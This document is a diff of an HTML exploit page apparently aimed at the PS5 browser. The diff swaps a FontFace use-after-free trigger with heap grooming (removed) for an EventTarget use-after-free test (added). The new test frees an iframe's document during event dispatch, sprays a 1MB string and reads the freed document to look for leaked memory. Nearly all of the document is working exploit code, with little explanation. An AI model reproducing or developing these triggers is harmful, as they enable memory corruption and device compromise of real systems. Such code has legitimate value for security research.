@@ -2,76 +2,65 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 FontFace UAF Trigger (Nathan Fargo Variant)</title>
-<style id="s">
-@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
-</style>
+<title>PS5 EventTarget UAF Info Leak Test</title>
 </head>
 <body>
-<pre id="log"></pre>
+<button id="btn" style="font-size:24px; padding:20px;">Run UAF Test</button>
+<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-window.onload = () => {
-    L('[+] Setup starting...');
-    
-    // Create the trigger face via JS API with a local source
-    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
-    
-    // Critical: forces the native loaded promise to be created early
-    void A.loaded; 
+document.getElementById('btn').onclick = () => {
+    L('[*] Starting EventTarget UAF Info Leak test...');
+    try {
+        const f = document.body.appendChild(document.createElement('iframe'));
+        const a = document.createElement('div');
+        const b = a.appendChild(document.createElement('div'));
 
-    let fired = false;
-    const origThen = Object.getOwnPropertyDescriptor(FontFace.prototype, 'then');
+        // Listener 1: Frees the Document and throws an exception
+        a.addEventListener('a', function() {
+            L('[1] Listener 1: Freeing document and throwing...');
+            document.adoptNode(a);
+            f.remove();
+            // Original used 64MB string. Let's try without the massive spray first,
+            // just to see if we can read the stale pointer without immediately crashing.
+            throw { sourceURL: 'A'.repeat(1024 * 1024) }; // 1MB spray
+        });
 
-    // Install same-stack thenable getter
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            if (!fired && this === A) {
-                fired = true;
-                L('[+] then getter fired! Synchronous re-entry achieved.');
+        // Listener 2: Buffer listener
+        a.addEventListener('a', () => {
+            L('[2] Listener 2: Buffer executed.');
+        });
 
-                // Mutate CSSOM: delete the CSS-connected rule for family 'x'
-                try {
-                    document.getElementById('s').sheet.deleteRule(0);
-                    L('[+] deleteRule(0) done');
-                } catch(e) {
-                    L('[!] deleteRule: ' + e);
-                }
-
-                // Create new FontFaces to churn the heap and groom the IsoHeap
-                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-
-                // Force style/layout flush
-                // Document::updateStyleIfNeeded -> Style::Scope::updateActiveStyleSheets
-                // -> CSSFontSelector::buildCompleted -> CSSFontFaceSet::remove(face)
-                document.body.offsetTop; 
-                L('[+] offsetTop forced style. face may be freed.');
-
-                // Restore then so promise machinery doesn't break
-                if (origThen) {
-                    Object.defineProperty(FontFace.prototype, 'then', origThen);
-                }
+        // Listener 3: Attempts to read properties from the freed Document
+        a.addEventListener('a', function() {
+            L('[3] Listener 3: Attempting to read freed document...');
+            let doc = f.contentDocument;
+            if (!doc) {
+                L('[3] f.contentDocument is null. No UAF object to read.');
+                return;
             }
-            return origThen ? origThen.value : undefined;
-        }
-    });
+            
+            L('[3] Got an object! Attempting reads...');
+            
+            // Try simple integer properties first (less likely to trigger complex virtual calls)
+            try { L('  nodeType: ' + doc.nodeType); } catch(e) { L('  nodeType ERR: ' + e); }
+            try { L('  childNodes.length: ' + doc.childNodes.length); } catch(e) { L('  childNodes.length ERR: ' + e); }
+            
+            // Try string properties
+            try { L('  URL: ' + doc.URL); } catch(e) { L('  URL ERR: ' + e); }
+            try { L('  readyState: ' + doc.readyState); } catch(e) { L('  readyState ERR: ' + e); }
+            
+            L('[3] Reads finished. If values look corrupted (e.g. nodeType is a huge number), we have a leak!');
+        });
 
-    L('[+] Calling document.fonts.load("1em x", "AB")');
-    document.fonts.load('1em x', 'AB').then(faces => {
-        L('[+] load() resolved, faces: ' + faces.length);
-        if (fired) {
-            L('[+] UAF window exercised. If vulnerable, memory is corrupted.');
-            L('[+] If ASAN is active, check logs for heap-use-after-free.');
-        } else {
-            L('[!] Getter did not fire. Synchronous resolution failed.');
-        }
-    }).catch(e => {
-        L('[!] load() rejected: ' + e);
-    });
+        L('[*] Dispatching event...');
+        b.dispatchEvent(new Event('a', { bubbles: true }));
+        L('[*] Dispatch returned.');
+
+    } catch (e) {
+        L('[!] Uncaught error: ' + e.message);
+    }
 };
 </script>
 </body>
